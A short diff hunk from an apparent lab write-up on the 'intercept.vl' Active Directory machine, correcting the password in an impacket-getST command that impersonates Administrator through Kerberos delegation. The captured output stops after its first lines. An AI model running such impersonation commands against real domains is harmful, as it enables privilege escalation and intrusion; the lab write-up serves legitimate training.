@@ -272,7 +272,7 @@ As seen from the last line, we can now impersonate.
 Now, we can obtain the TGT ticket using getST.
 
 ```zsh
-➜  ~ impacket-getST -spn host/ws01.intercept.vl -impersonate 'Administrator' 'intercept.vl'/'xpp$':'P@ssword1' -dc-ip 10.10.131.53
+➜  ~ impacket-getST -spn host/ws01.intercept.vl -impersonate 'Administrator' 'intercept.vl'/'xpp$':'P@ssword1!' -dc-ip 10.10.131.53
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 [-] CCache file is not found. Skipping...
 [*] Getting TGT for user
